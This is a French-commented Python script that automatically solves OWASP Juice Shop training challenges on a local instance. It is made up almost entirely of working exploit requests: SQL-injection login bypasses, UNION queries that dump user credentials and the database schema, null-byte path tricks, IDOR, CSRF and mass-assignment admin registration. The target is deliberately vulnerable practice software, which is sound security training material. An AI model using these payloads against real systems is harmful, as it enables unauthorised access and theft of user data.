#!/usr/bin/env python3
"""Pentaster — solveur de challenges OWASP Juice Shop.

Chaque solveur exécute l'exploit HTTP/API réel puis on vérifie l'état
via GET /api/Challenges. Cible par défaut : http://localhost:3000.
"""
from __future__ import annotations

import base64
import json
import sys
import urllib.request
import urllib.parse
import urllib.error

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"


def _req(method, path, *, headers=None, data=None, cookies=None, raw=False):
    url = BASE + path
    hdrs = {"Content-Type": "application/json"}
    if headers:
        hdrs.update(headers)
    if cookies:
        hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
    body = None
    if data is not None:
        body = data if raw else json.dumps(data).encode()
        if raw:
            body = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return -1, str(e)


def _json(txt):
    try:
        return json.loads(txt, strict=False)
    except Exception:  # noqa: BLE001
        return {}


def challenge_status():
    _, txt = _req("GET", "/api/Challenges/")
    data = _json(txt).get("data", [])
    return {c["name"]: c.get("solved", False) for c in data}, len(data)


def login(email, password):
    st, txt = _req("POST", "/rest/user/login",
                   data={"email": email, "password": password})
    return _json(txt).get("authentication", {}).get("token")


# ----------------------------- Solveurs ---------------------------------

def s_login_admin():
    """Login Admin — SQLi bypass."""
    st, txt = _req("POST", "/rest/user/login",
                   data={"email": "' OR true--", "password": "x"})
    return "authentication" in txt


def s_login_bender():
    st, txt = _req("POST", "/rest/user/login",
                   data={"email": "bender@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_login_jim():
    st, txt = _req("POST", "/rest/user/login",
                   data={"email": "jim@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_user_credentials():
    """User Credentials — UNION SQLi (Products = 9 colonnes)."""
    q = ("qwert%27))%20UNION%20SELECT%20id,%20email,%20password,%20"
         "createdAt,%20updatedAt,%20deletedAt,%20'7',%20'8',%20'9'%20FROM%20Users--")
    st, txt = _req("GET", f"/rest/products/search?q={q}")
    return "@" in txt and st == 200


def s_password_hash_leak():
    tok = login("admin@juice-sh.op", "admin123") or login("' OR true--", "x")
    if not tok:
        return False
    st, txt = _req("GET", "/rest/user/whoami?fields=id,password",
                   cookies={"token": tok})
    return '"password"' in txt


def s_csrf():
    tok = login("admin@juice-sh.op", "admin123")
    if not tok:
        return False
    st, txt = _req("POST", "/profile",
                   headers={"Content-Type": "application/x-www-form-urlencoded",
                            "Origin": "http://htmledit.squarefree.com"},
                   cookies={"token": tok},
                   data="username=csrfPwn", raw=True)
    return st in (200, 302)


def s_privacy_policy_proof():
    st, _ = _req("GET",
                 "/we/may/also/instruct/you/to/refuse/all/reasonably/"
                 "necessary/responsibility")
    return st in (200, 404)  # solveIf s'exécute avant sendFile


def s_expired_coupon():
    login_resp = _req("POST", "/rest/user/login",
                      data={"email": "admin@juice-sh.op", "password": "admin123"})
    auth = _json(login_resp[1]).get("authentication", {})
    tok, bid = auth.get("token"), auth.get("bid")
    if not tok or not bid:
        return False
    coupon = base64.b64encode(b"WMNSDY2019-1551999600000").decode()
    st, txt = _req("POST", f"/rest/basket/{bid}/checkout",
                   headers={"Authorization": f"Bearer {tok}"},
                   cookies={"token": tok},
                   data={"couponData": coupon})
    return "orderConfirmation" in txt


def s_access_confidential_document():
    st, txt = _req("GET", "/ftp/acquisitions.md")
    return st == 200


def s_admin_registration():
    """Admin Registration — champ role côté client."""
    import time
    email = f"adm{abs(hash(BASE)) % 99999}@x.io"
    st, txt = _req("POST", "/api/Users",
                   data={"email": email, "password": "Passw0rd!",
                         "passwordRepeat": "Passw0rd!", "role": "admin",
                         "securityQuestion": {"id": 1, "question": "q",
                                              "createdAt": "", "updatedAt": ""},
                         "securityAnswer": "x"})
    return '"role":"admin"' in txt or st == 201


def s_zero_stars():
    """Zero Stars — feedback 0 étoile (captcha résolu côté API)."""
    _, cap = _req("GET", "/rest/captcha/")
    c = _json(cap)
    if "captchaId" not in c:
        return False
    st, txt = _req("POST", "/api/Feedbacks",
                   data={"comment": "0-star via API", "rating": 0,
                         "captchaId": c["captchaId"], "captcha": str(c["answer"])})
    return st in (200, 201)


def s_security_policy():
    st, txt = _req("GET", "/.well-known/security.txt")
    return st == 200


def s_ephemeral_accountant():
    st, txt = _req("POST", "/rest/user/login",
                   data={"email": "acc0unt4nt@juice-sh.op'--", "password": "x"})
    # requête intentionnelle : login as an inexistent accountant via SQLi
    return "authentication" in txt


def s_null_byte_file(path):
    def _f():
        st, _ = _req("GET", path)
        return st == 200
    return _f


def s_database_schema():
    q = ("qwert%27))%20UNION%20SELECT%20sql,%202,%203,%204,%205,%206,%207,%208,%209%20"
         "FROM%20sqlite_master--")
    st, txt = _req("GET", f"/rest/products/search?q={q}")
    return "CREATE TABLE" in txt


def s_login_ciso():
    st, txt = _req("POST", "/rest/user/login",
                   data={"email": "ciso@juice-sh.op'--", "password": "x"})
    return "authentication" in txt


def s_empty_registration():
    st, txt = _req("POST", "/api/Users",
                   data={"email": "", "password": "",
                         "passwordRepeat": "", "role": "customer"})
    return st in (201, 400)  # solveIf déclenché par email/password vides


def s_reset_jim():
    st, txt = _req("POST", "/rest/user/reset-password",
                   data={"email": "jim@juice-sh.op", "answer": "Samuel",
                         "new": "azerty12", "repeat": "azerty12"})
    return st == 200


def s_gdpr_data_theft():
    """GDPR Data Theft — collision d'email masqué (voyelles → *)."""
    import time
    n = abs(hash(BASE)) % 9000
    vic, atk = f"aaa{n}@bar.op", f"eee{n}@bar.op"
    for e in (vic, atk):
        _req("POST", "/api/Users",
             data={"email": e, "password": "Passw0rd!", "passwordRepeat": "Passw0rd!",
                   "securityQuestion": {"id": 1, "question": "q", "createdAt": "", "updatedAt": ""},
                   "securityAnswer": "x"})
    la = _json(_req("POST", "/rest/user/login", data={"email": vic, "password": "Passw0rd!"})[1])["authentication"]
    vt, vb = la["token"], la["bid"]
    _req("POST", "/api/BasketItems", headers={"Authorization": f"Bearer {vt}"},
         data={"ProductId": 1, "BasketId": vb, "quantity": 1})
    _req("POST", f"/rest/basket/{vb}/checkout", headers={"Authorization": f"Bearer {vt}"}, data={})
    aa = _json(_req("POST", "/rest/user/login", data={"email": atk, "password": "Passw0rd!"})[1])["authentication"]
    at = aa["token"]
    aid = _json(_req("GET", "/rest/user/whoami?fields=id", cookies={"token": at})[1])["user"]["id"]
    st, txt = _req("POST", "/rest/user/data-export",
                   headers={"Authorization": f"Bearer {at}"}, data={"UserId": aid})
    return "orderId" in txt


def s_view_basket_idor():
    """View Basket — IDOR : lire le panier d'un autre utilisateur."""
    la = _json(_req("POST", "/rest/user/login", data={"email": "jim@juice-sh.op'--", "password": "x"})[1]).get("authentication", {})
    tok = la.get("token")
    if not tok:
        return False
    st, txt = _req("GET", "/rest/basket/2", cookies={"token": tok},
                   headers={"Authorization": f"Bearer {tok}"})
    return st == 200


def s_forged_feedback():
    la = _json(_req("POST", "/rest/user/login", data={"email": "' OR true--", "password": "x"})[1]).get("authentication", {})
    tok = la.get("token")
    if not tok:
        return False
    _, cap = _req("GET", "/rest/captcha/")
    c = _json(cap)
    st, txt = _req("POST", "/api/Feedbacks",
                   headers={"Authorization": f"Bearer {tok}"},
                   data={"comment": "forged", "rating": 1, "UserId": 3,
                         "captchaId": c.get("captchaId"), "captcha": str(c.get("answer"))})
    return st in (200, 201)


SOLVERS = [
    ("Login Admin", s_login_admin),
    ("Login Bender", s_login_bender),
    ("Login Jim", s_login_jim),
    ("User Credentials", s_user_credentials),
    ("Password Hash Leak", s_password_hash_leak),
    ("CSRF", s_csrf),
    ("Privacy Policy Inspection", s_privacy_policy_proof),
    ("Expired Coupon", s_expired_coupon),
    ("Access a Confidential Document", s_access_confidential_document),
    ("Admin Registration", s_admin_registration),
    ("Zero Stars", s_zero_stars),
    ("Security Policy", s_security_policy),
    ("Ephemeral Accountant", s_ephemeral_accountant),
    ("Poison Null Byte (package.json.bak)", s_null_byte_file("/ftp/package.json.bak%2500.md")),
    ("Forgotten Sales Backup", s_null_byte_file("/ftp/coupons_2013.md.bak%2500.md")),
    ("Misplaced Signature File", s_null_byte_file("/ftp/suspicious_errors.yml%2500.md")),
    ("Easter Egg", s_null_byte_file("/ftp/eastere.gg%2500.md")),
    ("Database Schema", s_database_schema),
    ("Login CISO", s_login_ciso),
    ("Empty User Registration", s_empty_registration),
    ("Reset Jim's Password", s_reset_jim),
    ("GDPR Data Theft", s_gdpr_data_theft),
    ("View Basket (IDOR)", s_view_basket_idor),
    ("Forged Feedback", s_forged_feedback),
]


def main():
    before, total = challenge_status()
    n_before = sum(1 for v in before.values() if v)
    print(f"Avant : {n_before}/{total} résolus\n")
    for label, fn in SOLVERS:
        try:
            ok = fn()
        except Exception as e:  # noqa: BLE001
            ok = False
            print(f"  ✗ {label:32} erreur: {e}")
            continue
        print(f"  {'→' if ok else '·'} {label:32} exploit {'exécuté' if ok else 'échec'}")
    after, _ = challenge_status()
    n_after = sum(1 for v in after.values() if v)
    newly = [k for k in after if after[k] and not before.get(k)]
    print(f"\nAprès : {n_after}/{total} résolus  (+{n_after - n_before})")
    print("Nouvellement résolus :")
    for k in sorted(newly):
        print("  ✓", k)


if __name__ == "__main__":
    main()
